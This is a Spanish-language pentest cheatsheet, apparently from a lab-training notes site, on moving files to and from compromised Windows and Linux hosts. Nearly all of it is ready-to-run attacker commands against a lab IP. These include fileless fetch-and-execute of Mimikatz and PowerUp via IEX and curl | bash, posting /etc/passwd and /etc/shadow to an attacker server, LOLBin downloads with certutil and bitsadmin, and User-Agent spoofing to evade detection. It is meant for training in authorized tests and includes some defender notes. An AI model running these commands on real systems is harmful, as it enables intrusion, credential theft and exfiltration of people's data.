---
title: "File Transfers"
description: "Windows/Linux, PowerShell, certutil, base64 y smbserver para post-explotación."
sidebar:
  order: 1
  label: "File Transfers"
---

<aside class="my-8 p-5 rounded-lg border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose shadow-lg backdrop-blur-sm">
  <div class="text-xs uppercase tracking-widest text-[#cba6f7] font-bold mb-2 font-mono flex items-center gap-2">
    <span class="inline-block w-2 h-2 rounded-full bg-[#cba6f7] animate-pulse"></span>
    Language Fallback · Contenido en Español
  </div>
  <p class="text-sm text-zinc-300 leading-relaxed">
    This methodology cheatsheet is currently written in Spanish. Technical command syntaxes, cheatsheets, and checklists remain highly readable. You can switch back to Spanish at any time using the language toggle above.
  </p>
</aside>

> Transferencia de archivos en todos los escenarios de pentest: Windows ↔ Linux, métodos HTTP/SMB/FTP/nc/SCP, LOLBins, cifrado y evasión de detección.

---


## Windows — Descargar a Target (desde Pwnbox)

### PowerShell — Base64 (sin red)

```bash
# Pwnbox: codificar archivo
cat id_rsa | base64 -w 0; echo
md5sum id_rsa    # verificar hash antes
```

```powershell
# Windows: decodificar y guardar
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5   # verificar hash
```

> ⚠️ cmd.exe tiene límite de 8191 caracteres. Si el string es muy largo, usar otro método.

### PowerShell — WebClient (HTTP/HTTPS/FTP)

```powershell
# DownloadFile — guarda en disco
(New-Object Net.WebClient).DownloadFile('http://10.10.14.1:8000/PowerView.ps1','C:\Users\Public\PowerView.ps1')
(New-Object Net.WebClient).DownloadFileAsync('http://10.10.14.1:8000/PowerView.ps1','C:\Users\Public\PowerView.ps1')

# DownloadString — fileless (ejecuta en memoria sin tocar disco)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/PowerUp.ps1') | IEX

# Invoke-WebRequest (alias: iwr, curl, wget) — PowerShell 3+
Invoke-WebRequest http://10.10.14.1:8000/PowerView.ps1 -OutFile PowerView.ps1

# Fix: IE first-launch config error
Invoke-WebRequest https://<IP>/PowerView.ps1 -UseBasicParsing | IEX

# Fix: SSL/TLS certificate error
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB — impacket-smbserver

```bash
# Pwnbox: crear share (sin auth — puede fallar en Windows modernos)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Pwnbox: crear share con credenciales (para Windows que bloquea guest)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
:: Windows: copiar desde share anónimo
copy \\10.10.14.1\share\nc.exe

:: Windows: montar share con credenciales
net use n: \\10.10.14.1\share /user:test test
copy n:\nc.exe
```

### FTP — pyftpdlib

```bash
# Pwnbox: servidor FTP anónimo
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
# Windows: descargar via PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.14.1/nc.exe', 'C:\Users\Public\nc.exe')
```

```cmd
:: Windows: cliente FTP en shell no interactiva
echo open 10.10.14.1 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET nc.exe >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Windows — Subir desde Target (a Pwnbox)

### PowerShell — Base64 hacia Pwnbox

```powershell
# Codificar en Windows
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```bash
# Pwnbox: decodificar
echo "<BASE64>" | base64 -d > hosts
md5sum hosts    # verificar
```

### HTTP Upload — uploadserver

```bash
# Pwnbox: instalar y lanzar servidor con upload
pip3 install uploadserver
python3 -m uploadserver
# UI en http://0.0.0.0:8000/upload
```

```powershell
# Windows: subir con PSUpload.ps1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1:8000/PSUpload.ps1')
Invoke-FileUpload -Uri http://10.10.14.1:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

```powershell
# Alternativa: base64 vía POST a nc listener
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://10.10.14.1:8000/ -Method POST -Body $b64
```

```bash
# Pwnbox: capturar con nc + decodificar
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```

### SMB Upload — WebDAV (SMB over HTTP)

```bash
# Pwnbox: instalar y lanzar WebDAV
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
:: Windows: conectar y subir
dir \\10.10.14.1\DavWWWRoot
copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\DavWWWRoot\
copy C:\Users\john\Desktop\archivo.zip \\10.10.14.1\sharefolder\
```

### FTP Upload

```bash
# Pwnbox: servidor FTP con escritura
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
# Windows: subir
(New-Object Net.WebClient).UploadFile('ftp://10.10.14.1/hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

```cmd
:: Cliente FTP no interactivo — subida
echo open 10.10.14.1 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## Linux — Descargar a Target (desde Pwnbox)

### Base64 (sin red)

```bash
# Pwnbox: codificar
cat id_rsa | base64 -w 0; echo
md5sum id_rsa

# Target Linux: decodificar
echo -n '<BASE64>' | base64 -d > id_rsa
md5sum id_rsa    # verificar
```

### wget / curl

```bash
wget http://10.10.14.1:8000/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh http://10.10.14.1:8000/LinEnum.sh
```

### Fileless — ejecutar sin tocar disco

```bash
curl http://10.10.14.1:8000/LinEnum.sh | bash
wget -qO- http://10.10.14.1:8000/script.py | python3
```

### /dev/tcp — Bash puro (sin herramientas externas)

```bash
exec 3<>/dev/tcp/10.10.14.1/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### SCP

```bash
# Habilitar SSH en Pwnbox primero
sudo systemctl enable ssh && sudo systemctl start ssh

# Target: descargar desde Pwnbox
scp usuario@10.10.14.1:/root/herramienta.sh .
```

### One-liners con lenguajes

```bash
# Python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.1:8000/LinEnum.sh", "LinEnum.sh")'

# Python2
python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.14.1:8000/LinEnum.sh", "LinEnum.sh")'

# PHP
php -r '$file = file_get_contents("http://10.10.14.1:8000/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
php -r '$lines = @file("http://10.10.14.1:8000/LinEnum.sh"); foreach ($lines as $line) { echo $line; }' | bash

# Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("http://10.10.14.1:8000/LinEnum.sh")))'

# Perl
perl -e 'use LWP::Simple; getstore("http://10.10.14.1:8000/LinEnum.sh", "LinEnum.sh");'
```

---

## Linux — Subir desde Target (a Pwnbox)

### HTTP Upload — uploadserver con HTTPS

```bash
# Pwnbox: certificado self-signed + servidor HTTPS
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Target: subir archivos
curl -X POST https://10.10.14.1/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### Servidor web en target → pull desde Pwnbox

```bash
# Target: levantar servidor
python3 -m http.server 8000
python2.7 -m SimpleHTTPServer 8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# Pwnbox: descargar el archivo
wget http://<TARGET_IP>:8000/archivo.txt
```

### SCP Upload

```bash
scp /etc/passwd htb-student@10.10.14.1:/home/htb-student/
```

### Python3 upload one-liner

```bash
python3 -c 'import requests;requests.post("http://10.10.14.1:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

## Métodos Misceláneos

### Netcat / Ncat — transferencia directa

```bash
# Opción A: target escucha, Pwnbox envía
## Target (recibe)
nc -l -p 8000 > archivo.exe
ncat -l -p 8000 --recv-only > archivo.exe

## Pwnbox (envía)
nc -q 0 <TARGET_IP> 8000 < archivo.exe
ncat --send-only <TARGET_IP> 8000 < archivo.exe

# Opción B: Pwnbox escucha, target conecta (útil si firewall bloquea inbound en target)
## Pwnbox (escucha + envía)
sudo nc -l -p 443 -q 0 < archivo.exe
sudo ncat -l -p 443 --send-only < archivo.exe

## Target (conecta + recibe)
nc 10.10.14.1 443 > archivo.exe
ncat 10.10.14.1 443 --recv-only > archivo.exe
cat < /dev/tcp/10.10.14.1/443 > archivo.exe   # sin nc
```

### PowerShell Remoting (WinRM — Windows a Windows)

```powershell
# Verificar conectividad WinRM
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Crear sesión
$Session = New-PSSession -ComputerName DATABASE01

# Copiar hacia la sesión remota
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copiar desde la sesión remota
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP — montar carpeta local

```bash
# Linux → Windows vía xfreerdp (carpeta local disponible en \\tsclient\linux)
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/htb/filetransfer

# Linux → Windows vía rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

---

## LOLBins — Windows (LOLBAS)

```powershell
# certutil — download (detectable por AMSI)
certutil.exe -verifyctl -split -f http://10.10.14.1:8000/nc.exe
certutil -urlcache -split -f http://10.10.14.1:8000/nc.exe

# certutil — upload (via POST a nc)
certreq.exe -Post -config http://10.10.14.1:8000/ c:\windows\win.ini

# bitsadmin — download
bitsadmin /transfer wcb /priority foreground http://10.10.14.1:8000/nc.exe C:\Temp\nc.exe

# BITS via PowerShell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.1:8000/nc.exe" -Destination "C:\Temp\nc.exe"

# JavaScript (cscript) — download
# Crear wget.js con el script y ejecutar:
cscript.exe /nologo wget.js http://10.10.14.1:8000/PowerView.ps1 PowerView.ps1

# VBScript (cscript) — download
# Crear wget.vbs con el script y ejecutar:
cscript.exe /nologo wget.vbs http://10.10.14.1:8000/PowerView.ps1 PowerView2.ps1

# GfxDownloadWrapper.exe (Intel GPU driver — si está presente)
GfxDownloadWrapper.exe "http://10.10.14.1:8000/mimikatz.exe" "C:\Temp\nc.exe"
```

> Referencia completa: lolbas-project.github.io — buscar `/download` o `/upload`

## GTFOBins — Linux

```bash
# openssl — transfer cifrado (nc-style)
## Pwnbox: servidor SSL
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

## Target: cliente SSL
openssl s_client -connect 10.10.14.1:80 -quiet > LinEnum.sh
```

> Referencia completa: gtfobins.github.io — buscar `+file download` o `+file upload`

---

## Cifrado de Archivos

### Windows — Invoke-AESEncryption.ps1

```powershell
# Importar script
Import-Module .\Invoke-AESEncryption.ps1

# Cifrar archivo (genera .aes)
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd_fuerte" -Path .\scan-results.txt

# Descifrar
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd_fuerte" -Path .\scan-results.txt.aes
```

### Linux — openssl enc

```bash
# Cifrar
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Descifrar
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

## Evasión de Detección

### Cambiar User-Agent en PowerShell

```powershell
# Listar User-Agents disponibles
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

# Usar User-Agent de Chrome
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.14.1:8000/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### User-Agents detectables (para defenders)

| Herramienta | User-Agent en servidor |
|-------------|----------------------|
| PowerShell `Invoke-WebRequest` | `WindowsPowerShell/5.1.XXXXX` |
| `certutil` | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |
| `Msxml2` | `MSIE 7.0; Windows NT 10.0; Win64` |
| cURL default | `curl/7.XX` |
| wget default | `Wget/1.XX` |

---

## Pitfalls / Gotchas

- **Verificar MD5** siempre: `md5sum` (Linux) / `Get-FileHash -Algorithm md5` (Windows). Transferencias corruptas pasan desapercibidas y luego fallan misteriosamente.
- **Base64 con archivos binarios** en cmd.exe está limitado a 8191 caracteres. Usar PowerShell o método de red para binarios grandes.
- **impacket-smbserver anónimo** es bloqueado por Windows 10/11 modernos. Usar `-user test -password test` y montar con `net use`.
- **pyftpdlib** en puerto 21 requiere `sudo`. Sin `--write`, las subidas fallan silenciosamente.
- **WebDAV keyword `DavWWWRoot`** es especial — reconocido por el Mini-Redirector driver. No es un directorio real en el servidor.
- **certutil** es detectado por AMSI como uso malicioso. Alternar con bitsadmin o LOLBins menos conocidos si hay EDR.
- **Fileless con IEX/curl|bash** deja rastros en memoria y en logs del proceso aunque no toque disco.
- **No exfiltrar PII/datos sensibles reales** — crear archivos dummy para testear DLP. Exfiltrar datos reales puede tener consecuencias legales.
- **RDP /drive:** hace que la carpeta sea accesible en `\\tsclient\<nombre>` — no es visible para otros usuarios en el host RDP.
- **SCP con clave robada** → siempre `chmod 600 id_rsa` antes de usarla.
- **uploadserver con HTTP** envía archivos en claro. Usar HTTPS con certificado cuando el contenido es sensible.

---

## Cheatsheets relacionados

- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — Transferir payloads y establecer reverse shells
- [Linux Privilege Escalation](/en/metodologias/privesc/linux-privilege-escalation/) — Transferir linpeas.sh al target
- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — Transferir winPEAS, PowerUp al target
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Transferir a través de pivots
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Exfiltrar NTDS.dit, BloodHound data
- [Getting Started](/en/metodologias/fundamentos/getting-started/) — Transferencias básicas y python http.server
